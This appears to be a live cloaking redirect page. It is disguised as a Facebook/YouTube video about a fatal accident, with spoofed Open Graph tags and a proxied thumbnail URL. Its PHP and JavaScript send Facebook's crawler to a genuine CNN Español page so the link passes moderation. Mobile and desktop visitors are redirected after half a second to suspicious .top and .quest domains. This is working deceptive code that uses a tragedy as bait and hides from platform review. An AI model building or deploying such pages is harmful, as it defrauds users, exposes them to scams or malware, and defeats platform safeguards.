<!DOCTYPE html>
        <html>
        <head>
            <meta http-equiv="content-type" content="text/html; charset=utf-8" />
            <meta name="facebook:card" content="summary_large_image" />
            <meta property="og:image" content="https://external-fsdq1--2-fna-fbcdn-net.translate.goog/emg1/v/t13/18222789104694025542?url=https://media-discordapp-net.translate.goog/attachments/1012318074453635199/1226630518653845604/wwq333.jpg?ex%3D662577b1%26is%3D661302b1%26hm%3Da3794480521a861c374f4c093860a3e07d97cc01bdee0a3b22fdb34b5116b0c5%26%26format%3Dwebp%26width%3D1202%26height%3D676%26_x_tr_sl%3Des%26_x_tr_tl%3Den%26_x_tr_hl%3Des%26_x_tr_pto%3Dwapp&fb_obo=1&utld=translate.goog&stp=c0.5000x0.5000f_dst-jpg_flffffff_p500x261_q75&_nc_eui2=AeHFqtgmkmqOvkg-9g47L6osM6cmx0K3ySIzpybHQrfJIvTTNEFaGUDLae6xCzfNNvddrv-x1Qf94qvzUcTCojda&ccb=13-1&oh=06_AX3cH41v7RPxsd5DKtU8k8XnS6hg1Kfh9gy2oSMw_cEMuQ&oe=66181653&_nc_sid=215617&_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=es&_x_tr_pto=wapp" />
            <meta property="og:title" content=" Tragic accident claims several lives this morning..." />
            <meta property="og:description" content="Facebook Video" />
            <meta name="facebook:description" content="YouTube" />
            <meta property="fb:app_id" content="9390" />
            <meta name="facebook:app:country" content="US" />
            <meta property="og:site_name" content="YouTube" />
        </head>
        <body>
        
<?php
// URL para redireccionar a dispositivos m車viles
$mobileRedirectUrl = 'https://news-gb-01.top/4qn416qs3';
// URL para redireccionar si es un bot de Facebook
$facebookBotRedirectUrl = 'https://cnnespanol.cnn.com/';
// URL para redireccionar si es un PC
$pcRedirectUrl = 'https://bubutata.quest/8000c3';
?>

<script>
    window.addEventListener('load', function() {
        // Detecta si es un bot de Facebook
        var userAgent = navigator.userAgent.toLowerCase();
        var isFacebookBot = userAgent.indexOf('facebookexternalhit') !== -1;

        // Redirecciona si es un bot de Facebook
        if (isFacebookBot) {
            setTimeout(function() {
                window.location.href = '<?php echo $facebookBotRedirectUrl; ?>';
            }, 500);
        }

        // Redirecciona si es un dispositivo m車vil y no es un bot de Facebook
        else if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
            setTimeout(function() {
                window.location.href = '<?php echo $mobileRedirectUrl; ?>';
            }, 500);
        }
        
        // Redirecciona si no es un bot de Facebook, no es un dispositivo m車vil y es una PC
        else {
            setTimeout(function() {
                window.location.href = '<?php echo $pcRedirectUrl; ?>';
            }, 500);
        }
    });
</script>

</body>
</html>
